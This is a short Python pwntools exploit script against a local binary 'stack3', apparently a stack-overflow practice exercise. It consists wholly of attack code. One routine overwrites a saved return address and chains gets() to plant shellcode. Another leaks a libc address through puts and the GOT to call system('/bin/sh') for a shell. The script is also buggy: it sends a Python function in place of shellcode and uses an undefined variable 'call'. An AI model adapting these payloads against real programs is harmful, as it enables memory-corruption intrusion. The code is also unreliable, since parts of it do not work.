from pwn import *
r = process("./stack3")
raw_input("?")
def shellcode():
	gets_plt = 0x08048330
	shelladdr = 0x08049010
	win = 0x08048424 
	buff = 0xffffd3ec
	check = 0xffffd42c
	#ret = 0x08048478
	payload = "A"*(check-buff) 
	payload += p32(win) 
	payload += "B"*12 
	payload += p32(gets_plt) 
	payload += p32(shelladdr) 
	payload += p32(shelladdr)
	r.sendline(payload)
	r.sendline(shellcode)
	r.interactive()

def ret2libc():
	buff = 0xffffd3ec
	check = 0xffffd42c
	win = 0x8048424
	main = 0x8048438
	put_plt = 0x8048360
	put_got = 0x8049698
	payload = "A"*(check-buff) 
	payload += p32(win) 
	payload += "B"*12 
	payload += p32(put_plt) 
	payload += p32(main) 
	payload += p32(put_got)
	r.sendline(payload)
	print r.recvuntil("changed\n")
	put_libc = u32(r.recv(4))
	base = put_libc - 0x5fca0
	sys = base + 0x3ada0
	binsh = base + 0x15ba0b
	print hex(put_libc)
	print hex(base)
	payload = "A"*(call-buff)
	payload += p32(win) 
	payload +=	"B"*4 
	payload += p32(sys) 
	payload += p32(main) 
	payload += p32(binsh)
	r.sendline(payload)
	r.interactive()
	
shellcode()

